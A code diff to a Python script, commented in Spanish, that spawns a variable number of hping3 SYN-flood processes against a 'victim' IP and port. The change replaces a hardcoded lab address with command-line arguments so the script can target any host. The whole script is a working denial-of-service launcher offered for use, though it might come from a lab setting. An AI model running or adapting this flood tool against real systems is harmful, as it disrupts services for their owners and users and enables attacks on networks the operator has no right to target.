@@ -1,8 +1,13 @@
+# Llamar este ejecutable con el puerto y la IP de la víctima como primer y segundo argumento, respectivamente.
+
 import atexit
+import re
+import socket
 import subprocess
+import sys
 
 
-def run_attacker():
+def run_attacker(victim_port: str, victim_ip: str):
     do_continue = True
     no_processes = 0
     processes = list()
@@ -28,8 +33,7 @@ def run_attacker():
             if new_no_processes > no_processes:
                 print(f"Iniciando {dif_no_processes} procesos de ataque.")
                 for _ in range(dif_no_processes):
-                    processes.append(subprocess.Popen(["hping3", "-S", "--flood", "-V", "-p", "8080", "192.168.10.30"],
-                                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+                    processes.append(subprocess.Popen(["hping3", "-S", "--flood", "-V", "-p", victim_port, victim_ip]))
                 print(f"Se iniciaron {dif_no_processes} procesos de ataque satisfactoriamente.")
             else:
                 print(f"Deteniendo {dif_no_processes} procesos de ataque.")
@@ -40,4 +44,9 @@ def run_attacker():
 
 
 if __name__ == "__main__":
-    run_attacker()
+    # Check that first argument is int.
+    int(sys.argv[1])
+    # Check that second argument is ip format.
+    socket.inet_aton(sys.argv[2])
+
+    run_attacker(sys.argv[1], sys.argv[2])
